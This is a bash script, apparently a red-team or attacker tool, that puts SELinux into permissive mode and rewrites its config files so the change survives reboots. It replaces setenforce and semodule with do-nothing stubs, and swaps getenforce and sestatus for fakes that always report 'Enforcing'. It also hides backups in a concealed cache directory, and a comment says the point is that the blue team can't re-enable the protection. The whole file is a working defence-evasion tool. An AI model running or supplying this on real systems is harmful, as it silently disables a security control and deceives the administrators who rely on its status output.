#!/usr/bin/env bash

BACKUP_DIR="/var/cache/.syspkg"
mkdir -p "$BACKUP_DIR"

# --- set permissive immediately with the real binary ---
SETENFORCE=$(which setenforce 2>/dev/null)
GETENFORCE=$(which getenforce 2>/dev/null)
SESTATUS=$(which sestatus   2>/dev/null)

if [[ -z "$SETENFORCE" ]]; then
    echo "[-] selinux tools not found, skipping"
    exit 0
fi

# idempotency — if backup already exists, binaries are already shadowed
if [[ -f "${BACKUP_DIR}/setenforce.orig" ]]; then
    echo "[!] already deployed — skipping (backup exists at ${BACKUP_DIR}/setenforce.orig)"
    exit 0
fi

"$SETENFORCE" 0 2>/dev/null

# --- persist across reboots ---
for conf in /etc/selinux/config /etc/sysconfig/selinux; do
    [[ -f "$conf" ]] || continue
    cp "$conf" "${BACKUP_DIR}/$(basename $conf).orig"
    sed -i 's/^SELINUX=.*/SELINUX=permissive/' "$conf"
done

# --- shadow setenforce: no-op wrapper, blue team cant re-enable ---
cp "$SETENFORCE" "${BACKUP_DIR}/setenforce.orig"
cat > "$SETENFORCE" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
chmod 755 "$SETENFORCE"

# --- shadow getenforce: always report Enforcing ---
if [[ -n "$GETENFORCE" ]]; then
    cp "$GETENFORCE" "${BACKUP_DIR}/getenforce.orig"
    cat > "$GETENFORCE" <<'EOF'
#!/usr/bin/env bash
echo "Enforcing"
EOF
    chmod 755 "$GETENFORCE"
fi

# --- shadow sestatus: fake full enforcing output ---
if [[ -n "$SESTATUS" ]]; then
    cp "$SESTATUS" "${BACKUP_DIR}/sestatus.orig"
    cat > "$SESTATUS" <<'EOF'
#!/usr/bin/env bash
cat <<'OUT'
SELinux status:                 enabled
SELinuxfs mount:                /sys/fs/selinux
SELinux mount point:            /sys/fs/selinux
Loaded policy name:             targeted
Current mode:                   enforcing
Mode from config file:          enforcing
Policy MLS status:              enabled
Policy deny_unknown status:     allowed
Memory protection checking:     actual (secure)
Max kernel policy version:      33
OUT
EOF
    chmod 755 "$SESTATUS"
fi

# --- nuke any local policy modules so they cant be reloaded ---
if command -v semodule &>/dev/null; then
    cp "$(which semodule)" "${BACKUP_DIR}/semodule.orig"
    cat > "$(which semodule)" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
    chmod 755 "$(which semodule)"
fi
